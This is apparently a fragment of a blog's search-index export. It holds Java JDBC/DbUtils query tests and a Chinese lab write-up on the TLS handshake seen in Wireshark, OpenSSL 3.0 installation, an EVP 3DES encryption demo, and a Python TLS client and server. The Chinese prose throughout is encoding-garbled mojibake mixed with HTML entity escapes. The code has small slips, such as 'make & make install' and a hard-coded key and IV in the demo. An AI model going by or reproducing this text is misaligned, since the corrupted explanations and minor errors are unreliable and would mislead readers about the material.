sql = \u0026#34;select id,name,email,birth from customers where id = ?\u0026#34;; // BeanHandler\u0026lt;Customer\u0026gt; handler = new BeanHandler\u0026lt;\u0026gt;(Customer.class); Customer customer = runner.query(conn, sql, handler, 23); System.out.println(customer);\tJDBCUtils.closeResource(conn, null); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* * æµ‹è¯•æŸ¥è¯¢:æŸ¥è¯¢å¤šæ¡è®°å½•æ„æˆçš„é›†åˆ * * ä½¿ç”¨ResultSetHandlerçš„å®ç°ç±»ï¼šBeanListHandler */ @Test public void testQueryList() throws Exception{ QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = \u0026#34;select id,name,email,birth from customers where id \u0026lt; ?\u0026#34;; // BeanListHandler\u0026lt;Customer\u0026gt; handler = new BeanListHandler\u0026lt;\u0026gt;(Customer.class); List\u0026lt;Customer\u0026gt; list = runner.query(conn, sql, handler, 23); list.forEach(System.out::println); JDBCUtils.closeResource(conn, null); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 /* * è‡ªå®šä¹‰ResultSetHandlerçš„å®ç°ç±» */ @Test public void testQueryInstance1() throws Exception{ QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = \u0026#34;select id,name,email,birth from customers where id = ?\u0026#34;; ResultSetHandler\u0026lt;Customer\u0026gt; handler = new ResultSetHandler\u0026lt;Customer\u0026gt;() { @Override public Customer handle(ResultSet rs) throws SQLException { System.out.println(\u0026#34;handle\u0026#34;); //\treturn new Customer(1,\u0026#34;Tom\u0026#34;,\u0026#34;tom@126.com\u0026#34;,new Date(123323432L)); if(rs.next()){ int id = rs.getInt(\u0026#34;id\u0026#34;); String name = rs.getString(\u0026#34;name\u0026#34;); String email = rs.getString(\u0026#34;email\u0026#34;); Date birth = rs.getDate(\u0026#34;birth\u0026#34;); return new Customer(id, name, email, birth); } return null; } }; Customer customer = runner.query(conn, sql, handler, 23); System.out.println(customer); JDBCUtils.closeResource(conn, null); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /* * å¦‚ä½•æŸ¥è¯¢ç±»ä¼¼äºæœ€å¤§çš„ï¼Œæœ€å°çš„ï¼Œå¹³å‡çš„ï¼Œæ€»å’Œï¼Œä¸ªæ•°ç›¸å…³çš„æ•°æ®ï¼Œ * ä½¿ç”¨ScalarHandler * */ @Test public void testQueryValue() throws Exception{ QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); //æµ‹è¯•ä¸€ï¼š //\tString sql = \u0026#34;select count(*) from customers where id \u0026lt; ?\u0026#34;; //\tScalarHandler handler = new ScalarHandler(); //\tlong count = (long) runner.query(conn, sql, handler, 20); //\tSystem.out.println(count); //æµ‹è¯•äºŒï¼š String sql = \u0026#34;select max(birth) from customers\u0026#34;; ScalarHandler handler = new ScalarHandler(); Date birth = (Date) runner.query(conn, sql, handler); System.out.println(birth); JDBCUtils.closeResource(conn, null); } ","permalink":"http://www.reus09.top/posts/tech/jdbc/","summary":"ä¸€ï¼šJDBCæ¦‚è¿° 1.1 æ•°æ®çš„æŒä¹…åŒ– æŒä¹…åŒ–(persistence)ï¼šæŠŠæ•°æ®ä¿å­˜åˆ°å¯æ‰ç”µå¼å­˜å‚¨è®¾å¤‡ä¸­ä»¥ä¾›ä¹‹åä½¿ç”¨ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç‰¹åˆ«æ˜¯ä¼ä¸šçº§åº”ç”¨ï¼Œ","title":"Jdbc"},{"content":"0x01 å®éªŒç›®çš„ SSL/TLSåè®®åˆ†æã€‚\nç”¨wiresharkæŠ“åŒ…ï¼Œåˆ†æSSL/TLSè¿æ¥å»ºç«‹çš„å››ä¸ªé˜¶æ®µã€‚ OpenSSLå®‰è£…ã€é…ç½®å’Œæµ‹è¯•ã€‚\nå®‰è£…é…ç½®OpenSSLã€‚ é…ç½®SSLæµ‹è¯•ç¯å¢ƒï¼Œèƒ½å¤Ÿåœ¨å®‰å…¨è¿æ¥ä¸Šå‘é€æ•°æ®ã€‚ 0x02 TLSåè®®åˆ†æ æºIPï¼š\næºIP : 10.122.201.99 ç›®çš„åŸŸå:www.baidu.com\næºIP : 110.242.68.4 TLS æ¡æ‰‹çš„ç›®çš„\nTCP ä¸‰æ¬¡æ¡æ‰‹ç»“æŸå’ŒæœåŠ¡å™¨æˆåŠŸè¿æ¥åï¼Œå®¢æˆ·ç«¯å°±å¼€å§‹å‘èµ·TLSè¿æ¥ï¼Œé¦–å…ˆä¼šè¿›å…¥TLSæ¡æ‰‹é˜¶æ®µã€‚TLSæ¡æ‰‹é˜¶æ®µç›®çš„ï¼š\nåå•†åŠ å¯†å¯†é’¥\nç”¨æ¥å¯¹åé¢çš„ HTTP åè®®ç­‰åº”ç”¨åè®®å†…å®¹è¿›è¡ŒåŠ å¯†ã€‚è¿™ä¸ªå¯†é’¥åˆç§°ä¸ºä¸»å¯†é’¥ï¼Œä¸ºåŠ å¯†ç®—æ³•çš„å¯†é’¥ã€‚ åå•†åŠ å¯†ç®—æ³•\nä¸ºäº†èƒ½å¤Ÿæä¾›æ•ˆç‡ï¼Œä½¿ç”¨å¯¹ç§°å¯†é’¥ã€‚å¯¹ç§°åŠ å¯†ä½¿ç”¨çš„æ˜¯ä½è¿ç®—ï¼Œé€Ÿåº¦å¿«ï¼Œç”šè‡³å¯ä»¥ç¡¬ä»¶åŠ é€Ÿã€‚éå¯¹ç§°åŠ å¯†æ¯”å¦‚ RSAï¼Œä½¿ç”¨äº†å¤§æ•°ä¹˜æ³•ç­‰ï¼Œæ•´ä½“ä¼šæ¯”è¾ƒæ…¢ã€‚å¯¹ç§°åŠ å¯†åªè¦å¯†é’¥æ²¡æœ‰æ³„æ¼ï¼Œé‚£ä¹Ÿæ˜¯éå¸¸å®‰å…¨çš„ã€‚è¿™ä¹Ÿæ˜¯åé¢ SSL æ¡æ‰‹åè®®è¦ç¡®ä¿çš„ã€‚ éªŒè¯èº«ä»½åŠæ•°æ®å®Œæ•´æ€§\né€šå¸¸æƒ…å†µä¸‹ï¼Œåªè¦éªŒè¯æœåŠ¡ç«¯èº«ä»½ã€‚ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œæ¯”å¦‚ä¸€äº›å®‰å…¨çº§åˆ«é«˜çš„åº”ç”¨åœºæ™¯ï¼Œè¿˜è¦éªŒè¯å®¢æˆ·ç«¯èº«ä»½ã€‚æœåŠ¡ç«¯ä¼šè¿”å›è¯ä¹¦é“¾ï¼Œæœ‰æ ¹ CA è¯ä¹¦åœ¨é‡Œå¤´ã€‚é€šè¿‡è¯ä¹¦çš„é“¾å¼æ‹…ä¿ï¼Œå¯ä»¥ç¡®è®¤æœåŠ¡ç«¯æ˜¯å¦æ˜¯å¯ä¿¡ä»»çš„ã€‚åŒæ—¶ï¼Œåœ¨æ¡æ‰‹æœŸé—´ï¼Œå…¬é’¥ä¼ è¾“æˆåŠŸåï¼Œè¿˜ä¼šå¯¹æŸäº›ä¿¡æ¯è¿›è¡Œæ•°å­—ç­¾åï¼Œç¡®ä¿æ•°æ®æ²¡æœ‰è¢«ç¯¡æ”¹ä¸”èº«ä»½æ— è¯¯ã€‚TLSæ¡æ‰‹é˜¶æ®µä¸€èˆ¬æµç¨‹ï¼ˆTLSæ¡æ‰‹çš„æµç¨‹å¹¶ä¸æ˜¯ä¸€æˆä¸å˜çš„ï¼Œæ ¹æ®å®é™…çš„åº”ç”¨åœºæ™¯æ¥ï¼Œä¸»è¦æœ‰ä¸‰ç§ï¼‰ï¼š åªéªŒè¯æœåŠ¡ç«¯\nè¿™ä¸ªç”¨ä¸‰ä¸ªé˜¶æ®µå°±å®Œæˆæ¡æ‰‹ï¼Œæ­¤æ¬¡Wiresharkçš„è¯·æ±‚ä¹Ÿæ˜¯è¿™æ ·ã€‚ä¸€èˆ¬çš„ç½‘ç»œè¯·æ±‚ä¹Ÿä»…ä»…åˆ°è¿™ä¸ªç¨‹åº¦ã€‚ éªŒè¯æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯\nåœ¨å®‰å…¨æ€§è¦æ±‚è¾ƒé«˜çš„åœºæ™¯ï¼ŒæœåŠ¡ç«¯ä¹Ÿè¦éªŒè¯å®¢æˆ·ç«¯çš„èº«ä»½ã€‚æ–¹å¼ä¹Ÿæ˜¯å‘è¯ä¹¦è¯æ˜è‡ªå·±ã€‚ æ¢å¤åŸæœ‰ä¼šè¯\nè¿™ä¸ªå±äºHTTPS ä¼˜åŒ–çš„èŒƒç•´ã€‚ä½¿ç”¨ Session Ticket æˆ–è€… Session ID æœºåˆ¶æ¢å¤ä¹‹å‰å·²ç»å®Œæˆæ¡æ‰‹çš„ä¼šè¯ã€‚è¿™ä¸ªæ˜¯å¯ä»¥å…è®¸åœ¨ä¸åŒçš„ TCP ä¸Šè¿›è¡Œçš„ã€‚å› ä¸ºæ¡æ‰‹çš„åŠ å¯†æ•°æ®å·²ç»ä¿å­˜ï¼Œç›´æ¥æ¢å¤å°±å¯ä»¥å¼€å§‹ä¼ é€’äº†ã€‚Session Ticket ç”±å®¢æˆ·ç«¯ä¿å­˜åŠ å¯†ä¿¡æ¯ï¼ŒSession ID çš„æ–¹å¼ç”±æœåŠ¡ç«¯ä¿å­˜åŠ å¯†ä¿¡æ¯ã€‚ä¸è¿‡ Session Ticket åœ¨ Android å®¢æˆ·ç«¯è¿˜æ²¡æœ‰å¾—åˆ°å¹¿æ³›çš„æ”¯æŒï¼Œå’Œå…·ä½“æœºå‹å’Œå†…ç½®çš„ OpenSSL çš„ç‰ˆæœ¬æœ‰å…³ã€‚ TLSæ¡æ‰‹æœºåˆ¶å›¾è§£\nClient Hello\nåœ¨Wiresharkè½¯ä»¶ä¸­æ•è·äº†è®¿é—®ç™¾åº¦ç½‘é¡µæ•°æ®åŒ…ï¼Œè¿½è¸ªTCPæµå¾—åˆ°ç¬¬ä¸€ä¸ªTLSåŒ…\nç±»å‹ é•¿åº¦ ç‰ˆæœ¬ TLS 1.2 ä¹Ÿæ˜¯ SSLv3.2ã€‚è¿™æ˜¯ SSL å®¢æˆ·ç«¯èƒ½å¤Ÿæ”¯æŒçš„ SSL æœ€é«˜ç‰ˆæœ¬ éšæœºæ•°\nç”Ÿæˆä¸€ä¸ª32å­—èŠ‚éšæœºæ•°ï¼ˆå›¾ä¸­çš„éšæœºæ•°ï¼‰ã€‚æœ€ååŠ å¯†æ•°æ®ç”¨çš„ä¸»å¯†é’¥ï¼Œéœ€è¦å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¸€èµ·åå•†å‡ºæ¥ã€‚åé¢æœåŠ¡ç«¯çš„ Server Hello é˜¶æ®µä¹Ÿä¼šç”Ÿæˆä¸€ä¸ªéšæœºæ•°ã€‚ä¸€åŒç”¨æ¥è®¡ç®—å‡ºä¸»å¯†é’¥ã€‚ ä¼šè¯ID\nè¿™ä¸ª Session ID æ˜¯å¯ä»¥é‡ç”¨çš„ï¼Œå…·ä½“çœ‹æœåŠ¡ç«¯èµ„æºå’Œæ”¯æŒæƒ…å†µã€‚å¦‚æœè¦å¤ç”¨ Session IDï¼Œ SSL æœåŠ¡ç«¯éœ€è¦ç»´æŠ¤è¿æ¥çš„çŠ¶æ€å’Œä¸Šæ¬¡æ¡æ‰‹æˆåŠŸç•™ä¸‹çš„åŠ å¯†ä¿¡æ¯ã€‚å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è®¿é—®è¯¥ç½‘å€ï¼Œä¼šè¯ ID å°šæœªåˆ›å»ºï¼Œå®¢æˆ·ç«¯æ²¡è®°å½•ï¼Œä¸º 0ã€‚å¦‚æœå®¢æˆ·ç«¯ä¿å­˜äº† Session ID çš„ä¿¡æ¯ï¼Œä¸‹æ¬¡å‘èµ· SSL è¯·æ±‚çš„æ—¶å€™ä¼šå¸¦ä¸Šã€‚ åŠ å¯†å¥—ä»¶\nå®¢æˆ·ç«¯å¯ä»¥æ”¯æŒçš„å¯†ç å¥—ä»¶åˆ—è¡¨ã€‚è¿™äº›å¥—ä»¶ä¼šæ ¹æ®ä¼˜å…ˆçº§æ’åºã€‚æ¯ä¸€ä¸ªå¥—ä»¶ä»£è¡¨ä¸€ä¸ªå¯†é’¥è§„æ ¼ã€‚ä»¥ â€œTLSâ€ å¼€å¤´ï¼Œæ¥ç€æ˜¯å¯†é’¥äº¤æ¢ç®—æ³•ï¼Œç„¶åç”¨ â€œWITHâ€ è¿æ¥åŠ å¯†ç®—æ³•å’Œè®¤è¯ç®—æ³•ã€‚ä¸€ä¸ªåŠ å¯†å¥—ä»¶æœ‰è¿™ä¹ˆå‡ ä¸ªå†…å®¹ï¼šå¯†é’¥äº¤æ¢ç®—æ³•ã€åŠ å¯†ç®—æ³•ï¼ˆä¼šå¸¦æœ‰æ”¯æŒçš„æœ€é«˜å¯†é’¥ä½æ•°ï¼‰ã€è®¤è¯ç®—æ³•è¿˜æœ‰åŠ å¯†æ–¹å¼ã€‚æœ€ç»ˆä½¿ç”¨ä»€ä¹ˆå¯†ç å¥—ä»¶æ˜¯æœåŠ¡ç«¯å†³å®šçš„ã€‚è¦ä»€ä¹ˆå¯†ç å¥—ä»¶ä¼šåœ¨ Server Hello ä¸­è¿›è¡Œåé¦ˆã€‚ å‹ç¼©ç®—æ³•\nè¿™é‡Œä¸º 0ï¼Œè¯´æ˜ä¸æ”¯æŒå‹ç¼©ç®—æ³• æ‰©å±•å­—æ®µ\nä¸€äº›æ‰©å±•ä¿¡æ¯ï¼Œæ¯”å¦‚ SNI çš„æ”¯æŒï¼ŒALPN çš„ä¿¡æ¯ç­‰ç­‰ Server Hello\nç±»å‹ ç‰ˆæœ¬ æŒ‡å®šè¿™æ¬¡ SSL ä½¿ç”¨ TLSv1.2 ç‰ˆæœ¬ éšæœºæ•°\nä¸Šé¢çš„ Client Hello è¿‡ç¨‹ä¹Ÿç”Ÿäº§äº†ä¸€ä¸ª 32 ä½éšæœºæ•°ï¼Œè¿™ä¸¤ä¸ªéšæœºæ•°å°†å‚ä¸ä¸»å¯†é’¥ï¼ˆmaster keyï¼‰çš„åˆ›å»ºã€‚ï¼ˆå¯¹åº”å›¾è§£ä¸­éšæœºæ•°2ï¼‰ ä¼šè¯ID\nåŠ å¯†å¥—ä»¶\nTLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 ã€‚è¿™ä¸ªæ˜¯ä»å®¢æˆ·ç«¯ Client Hello ä¸Šä¼ çš„åŠ å¯†å¥—ä»¶ä¸­é€‰ä¸­çš„ï¼Œæ ¹æ®å¯†ç å¥—ä»¶çš„æ ¼å¼ï¼Œä¸Šé¢çš„ä¿¡æ¯æœ‰ï¼Œ äº¤æ¢åŠ å¯†ç®—æ³•ä¸ºECDHE ï¼Œå°±æ˜¯EC Diffie-Hellman ï¼ŒRSA è¡¨ç¤ºåé¢ Server Key Exchange é˜¶æ®µçš„æºå¸¦ DH åŠ å¯†ç®—æ³•çš„å…¬é’¥çš„åŒ…çš„æ•°å­—ç­¾åçš„åŠ å¯†ç®—æ³•æ˜¯ RSAï¼› åŠ å¯†ç®—æ³•ä¸º AES ï¼Œæœ€é«˜å¯†é’¥æ”¯æŒ 128 ä½ è®¤è¯ç®—æ³• SHA256 å‹ç¼©æ–¹æ³• è¿™é‡Œä¸º 0ï¼Œè¡¨ç¤ºä¸ä½¿ç”¨å‹ç¼©ç®—æ³• Certificate\næœåŠ¡ç«¯ä¸‹å‘è¯ä¹¦ï¼Œå®¢æˆ·ç«¯éªŒè¯æœåŠ¡ç«¯çš„èº«ä»½ï¼Œå¹¶ä¸”å–å‡ºè¯ä¹¦æºå¸¦çš„å…¬é’¥ï¼Œè¿™ä¸ªå…¬é’¥æ˜¯äº¤æ¢åŠ å¯†ç®—æ³•çš„å…¬é’¥ã€‚ä¹Ÿå°±æ˜¯åœ¨ Server Hello é˜¶æ®µæŒ‡å®šçš„ ECDHE ï¼ˆEC Diffie-Hellmanï¼‰ç®—æ³•ï¼Œä¹Ÿæ˜¯é€šå¸¸è¯´çš„ DH åŠ å¯†ã€‚\nè¿™ä¸ª Certificate æ¶ˆæ¯ä¸‹å‘äº†ä»æºå¸¦è‡ªå·±å…¬é’¥çš„æ•°å­—è¯ä¹¦å’Œ CA è¯ä¹¦çš„è¯ä¹¦é“¾ï¼Œåœ¨ Certificates å­—æ®µä¸­ï¼š\nç”±å­—æ®µä¿¡æ¯å¯çŸ¥ï¼Œè¯ä¹¦é“¾ä¸­å…±æœ‰2ä¸ªæ•°å­—è¯ä¹¦ã€‚åˆ†åˆ«ä¸ºæœåŠ¡ç«¯(https://baidu.com)è¯ä¹¦ -\u0026gt; æ ¹CAè¯ä¹¦ã€‚é¦–å…ˆçœ‹æœåŠ¡ç«¯è¯ä¹¦\né¦–å…ˆæ˜¯ signedCertificate å­—æ®µçš„å†…å®¹ï¼Œå³æ•°å­—è¯ä¹¦çš„æ•°æ®\nç‰ˆæœ¬\nå¯¹åº”çš„å°±æ˜¯ X.509 V3 æ ‡å‡† åºåˆ—å·\nserialNumberï¼Œè¯ä¹¦é¢å‘è€…å”¯ä¸€åºåˆ—å·ã€‚ ç­¾åç®—æ³•ID\nè¿™é‡ŒæŒ‡çš„æ˜¯ä½¿ç”¨ SHA-256 è¿›è¡Œæ‘˜è¦ï¼ŒRSA è¿›è¡ŒåŠ å¯†çš„ç­¾åç®—æ³•ã€‚ è¯ä¹¦é¢å‘è€…\nissuerï¼Œå°±æ˜¯é¢å‘è¯¥è¯ä¹¦çš„ CA çš„ä¿¡æ¯ã€‚é‡Œé¢æºå¸¦åè¯¥ CA çš„å”¯ä¸€åç§°ï¼ˆDNï¼ŒDistinguished Nameï¼‰ï¼Œæ¯”å¦‚å›½å®¶ä¸º USï¼ˆç¾å›½ï¼‰ï¼Œç»„ç»‡æœºæ„ä¸º DigiCert Inc.ï¼Œåç§°ä¸º GeoTrust CN RSA CA G1ã€‚åé¢æˆ‘ä»¬éœ€è¦ä»è¯ä¹¦é“¾æ‰¾åˆ°è¯¥ CA è¯ä¹¦ï¼ˆå…·ä½“æ–¹æ³•ï¼šåœ¨å…¶ä»–è¯ä¹¦çš„subjectå­—æ®µæŸ¥æ‰¾å›½å®¶ã€ç»„ç»‡æœºæ„ã€åç§°ï¼‰ï¼Œå»è®¤è¯å½“å‰è¯ä¹¦ æœ‰æ•ˆæœŸ\nvalidityï¼Œè¯ä¹¦çš„èµ·å§‹æ—¶é—´å’Œç»ˆæ­¢æ—¶é—´ å¯¹è±¡åç§°\nsubjectï¼Œé‡Œé¢å°±æ˜¯è¯¥è¯ä¹¦çš„åç§°ç­‰ä¸»è¦ä¿¡æ¯äº†ã€‚æ¯”å¦‚å›½å®¶ä¸º CNï¼ˆä¸­å›½ï¼‰ï¼Œç»„ç»‡ä¸ºBaidu Netcin Science Technology . å¯¹è±¡å…¬é’¥ä¿¡æ¯\nsubjectPublicKeyInfoã€‚å› ä¸ºè¿™æ˜¯æœåŠ¡ç«¯è¯ä¹¦ï¼Œè¿™ä¸ªå…¬é’¥åé¢å°†ç”¨äºä¸»å¯†é’¥çš„äº¤æ¢è¿‡ç¨‹ï¼Œä»ä¸­å¯ä»¥äº†è§£åˆ°è¿™ä¸ªå…¬é’¥é‡‡ç”¨ RSA åŠ å¯† æ‰©å±•éƒ¨åˆ†\nä¸€äº›æ‰©å±•ä¿¡æ¯ã€‚æ¯”å¦‚å¯¹è±¡çš„åˆ«åã€‚è¿™ä¸ªå¦‚æœæ˜¯ CDN çš„æœåŠ¡å™¨è¯ä¹¦ï¼Œé‚£ä¹ˆåˆ«åå°†ä¼šéå¸¸å¤šã€‚ ç„¶åæ˜¯è¯ä¹¦é¢å‘æœºæ„çš„ç­¾åä¿¡æ¯ï¼š\nç­¾åç®—æ³• algorithmIdentifierï¼Œè¿™é‡Œå¾—å‡ºä½¿ç”¨çš„è¿˜æ˜¯ SHA-256 æ‘˜è¦åŠ  RSA åŠ å¯†çš„ç­¾åç®—æ³•ã€‚è¿™ä¸ªå°±æ˜¯è®¤è¯è¯¥è¯ä¹¦çš„ CA è¯ä¹¦ä½¿ç”¨çš„ç­¾åç®—æ³•ã€‚ ç­¾åä¿¡æ¯ encryptedï¼Œè¿™ä¸ªä¿¡æ¯çš„å†…å®¹ï¼ŒCA è¯ä¹¦å¯¹ SHA-256 å¯¹ä¸Šé¢çš„æ•°æ®éƒ¨åˆ†è¿›è¡Œæ‘˜è¦åï¼Œä½¿ç”¨ RSA çš„ç§é’¥åŠ å¯†è·å¾—ã€‚åé¢ä¼šç”¨åœ¨è¯¥è¯ä¹¦çš„è®¤è¯è¿‡ç¨‹ï¼Œå–å‡º CA è¯ä¹¦çš„å…¬é’¥ï¼Œè§£å¯†ç­¾åä¿¡æ¯ï¼Œç”¨åŒæ ·çš„ç®—æ³•è·å–æ•°æ®æ‘˜è¦ï¼Œå¯¹æ¯”ä¸€ä¸‹æ˜¯å¦ç›¸åŒã€‚ Serve Key Exchange\nServer Hello Done\nClient Key Exchange\nChange Cipher Spec (Client)\nEncrypted Handshake Message (Client)\nChange Cipher Spec (Server)\nEncrypted Handshake Message (Server)\nApplication Data\n0x03 OpenSSL 3.0 ç¯å¢ƒ ç³»ç»Ÿä¸ºubuntu 16:ï¼ŒIPåœ°å€ä¸ºï¼š192.168.195.149 3.1 OpenSLLå®‰è£… OpenSLLç¼–è¯‘\næ‰§è¡Œå‘½ä»¤ï¼š tar -xzvf openssl-3.0.0.tar.gz è¿™é‡Œçš„xzvfå‚æ•°çš„å«ä¹‰å¦‚ä¸‹ï¼š xï¼šè§£å‹taræ ¼å¼çš„æ–‡ä»¶ vï¼šè§£å‹æ—¶æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ zï¼šä½¿ç”¨gzipç¨‹åºè§£å‹ fï¼šä½¿ç”¨å½’æ¡£ é…ç½®\nè§£å‹å®Œæˆåæ£€æŸ¥æ–‡ä»¶å¤¹\nåœ¨æ–‡ä»¶å¤¹å†…è¿è¡Œ\n./Configure å†™ä¸€ä¸‹å®‰è£…è·¯å¾„çš„é»˜è®¤è§„åˆ’ä¸º\næ–‡ä»¶ç±»å‹ è·¯å¾„ äºŒè¿›åˆ¶æ–‡ä»¶ usr\\local\\bin é…ç½®æ–‡ä»¶ usr\\local\\etc åº“æ–‡ä»¶ usr\\local\\local ç¼–è¯‘\nåœ¨åŸæ¥çš„æ–‡ä»¶å¤¹é‡Œé¢è¿è¡ŒmakeæŒ‡ä»¤\n1 make \u0026amp; make install ç­‰å¾…è¾“å‡ºå®Œæˆï¼Œè¾“å…¥æŒ‡ä»¤\n1 make test å¯ä»¥çœ‹åˆ°æ­£åœ¨è¿›è¡Œæµ‹è¯•ã€‚\nå¹¶ä¸”æœ€åçš„æµ‹è¯•ç»“æœä¹Ÿæ˜¯é€šè¿‡çš„ã€‚\næœ€åå‘½ä»¤ï¼šsudo make install\n3.2 OpenSLLé…ç½® é…ç½®å®Œæˆ ç¼–è¯‘æµ‹è¯•æ–‡ä»¶\næµ‹è¯•æ–‡ä»¶æºç å¦‚ä¸‹ 1 2 3 4 5 6 7 8 9 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;evp.h\u0026gt; int main() { printf(\u0026#34;hello world!\u0026#34;); OpenSSL_add_all_algorithms(); return 0; } åŠ å¯†æµ‹è¯•\næºç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;openssl/evp.h\u0026gt; #include \u0026lt;openssl/x509.h\u0026gt; void tEVP_Encrypt() { unsigned char key[EVP_MAX_KEY_LENGTH];//å¯†é’¥ unsigned char iv[EVP_MAX_KEY_LENGTH];//åˆå§‹åŒ–å‘é‡ /* old usage*/ //EVP_CIPHER_CTX ctx;//EVPç®—æ³•ä¸Šä¸‹æ–‡ /* old usage*/ EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new(); unsigned char out[1024];//è¾“å‡ºå¯†æ–‡ç¼“å†²åŒº int outl;//å¯†æ–‡é•¿åº¦ int outltmp; char *msg=\u0026#34;Hello OpenSSL\u0026#34;;//å¾…åŠ å¯†çš„æ•°æ® int rv; int i;\t//è®¾ç½®keyå’Œivï¼ˆå¯ä»¥é‡‡ç”¨éšæœºæ•°å’Œå¯ä»¥æ˜¯ç”¨æˆ·è¾“å…¥ï¼‰ for(i=0;i\u0026lt;24;i++) { key[i]=i; } for(i=0;i\u0026lt;8;i++) {iv[i]=i; }//åˆå§‹åŒ–å¯†ç ç®—æ³•ç»“æ„ä½“ EVP_CIPHER_CTX_init(ctx); //è®¾ç½®ç®—æ³•å’Œå¯†é’¥ä»¥åŠå‘é‡ rv = EVP_EncryptInit_ex(ctx,EVP_des_ede3_cbc(),NULL,key,iv); if(rv!=1) { printf(\u0026#34;Err\\n\u0026#34;); return; } //æ•°æ®åŠ å¯† rv = EVP_EncryptUpdate(ctx,out,\u0026amp;outl,(const unsigned char*)msg,strlen(msg)); if(rv!=1) { printf(\u0026#34;Err\\n\u0026#34;); return; }//ç»“æŸæ•°æ®åŠ å¯†ï¼ŒæŠŠå‰©ä½™æ•°æ®è¾“å‡º rv = EVP_EncryptFinal_ex(ctx,out+outl,\u0026amp;outltmp); if(rv!=1) { printf(\u0026#34;Err\\n\u0026#34;); return; } outl = outl +outltmp; printf(\u0026#34;Original text:%s\\n\u0026#34;,msg); //æ‰“å°è¾“å‡ºå¯†æ–‡ printf(\u0026#34;Length of ciphertext:%d\\n Data of ciphertext:\\n\u0026#34;,outl); for(i=0;i\u0026lt;outl;i++) { printf(\u0026#34;0x%02x \u0026#34;,out[i]); }printf(\u0026#34;\\n\u0026#34;); } int main() { OpenSSL_add_all_algorithms(); tEVP_Encrypt(); return 0; } ç¼–è¯‘ï¼šg++ test2.cpp -o test2 -I /usr/local/include/openssl/ -lcrypto -lssl\n3.3 OpenSLLæµ‹è¯• è¿™é‡Œé€šè¿‡pythonä»£ç è¿›è¡Œæ¼”ç¤º TLSè¿æ¥\næœåŠ¡ç«¯\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import socket import ssl class server_ssl: def build_listen(self): # ç”ŸæˆSSLä¸Šä¸‹æ–‡ context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER) # åŠ è½½æœåŠ¡å™¨æ‰€ç”¨è¯ä¹¦å’Œç§é’¥ context.load_cert_chain(\u0026#39;server.crt\u0026#39;, \u0026#39;key.pem\u0026#39;) # ç›‘å¬ç«¯å£ with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock: sock.bind((\u0026#39;192.168.195.149\u0026#39;,7777)) sock.listen(5) # å°†socketæ‰“åŒ…æˆSSL socket with context.wrap_socket(sock, server_side=True) as ssock: while True: # æ¥æ”¶å®¢æˆ·ç«¯è¿æ¥ client_socket, addr = ssock.accept() msg = client_socket.recv(1024).decode(\u0026#34;utf-8\u0026#34;) print(f\u0026#34;receive msg from client {addr}ï¼š{msg}\u0026#34;) # å‘å®¢æˆ·ç«¯å‘é€ä¿¡æ¯ msg = f\u0026#34;yes , you have client_socketect with server.\\r\\n\u0026#34;.encode(\u0026#34;utf-8\u0026#34; ) client_socket.send(msg) client_socket.close() if __name__ == \u0026#34;__main__\u0026#34;: server = server_ssl() server.build_listen() å®¢æˆ·ç«¯ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import socket import ssl class client_ssl: def send_hello(self,): # ç”ŸæˆSSLä¸Šä¸‹æ–‡ context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT) # åŠ è½½ä¿¡ä»»æ ¹è¯ä¹¦ context.load_verify_locations(\u0026#39;ca.crt\u0026#39;) #ä¸æœåŠ¡ç«¯å»ºç«‹socketè¿æ¥ with socket.create_connection((\u0026#39;192.168.195.149\u0026#39;,7777)) as sock: # å°†socketæ‰“åŒ…æˆSSL socket # ä¸€å®šè¦æ³¨æ„çš„æ˜¯è¿™é‡Œçš„server_hostnameä¸æ˜¯æŒ‡æœåŠ¡ç«¯IPï¼Œè€Œæ˜¯æŒ‡æœåŠ¡ç«¯è¯ä¹¦ä¸­è®¾ç½®çš„CN with context.wrap_socket(sock, server_hostname=\u0026#39;127.0.0.1\u0026#39;) as ssock: msg = \u0026#34;do i connect with server ?\u0026#34;.encode(\u0026#34;utf-8\u0026#34;) ssock.send(msg) # æ¥æ”¶æœåŠ¡ç«¯è¿”å›çš„ä¿¡æ¯ msg = ssock.recv(1024).decode(\u0026#34;utf-8\u0026#34;) print(f\u0026#34;receive msg from server : {msg}\u0026#34;) ssock.close() if __name__ == \u0026#34;__main__\u0026#34;: client = client_ssl() client.send_hello() è¿™é‡Œçš„è¯ä¹¦æˆ‘é‡‡å–è‡ªå·±ç”Ÿæˆ\nè¿›å…¥Ubuntu desktopï¼Œæ–‡ä»¶åä¸ºkey\nmkdir key\nç”ŸæˆCAç§é’¥ openssl genrsa -out ca.key 2048\nç”¨CAç§é’¥ç”ŸæˆCAçš„è¯ä¹¦ openssl req -new -x509 -days 365 -key ca.key -out 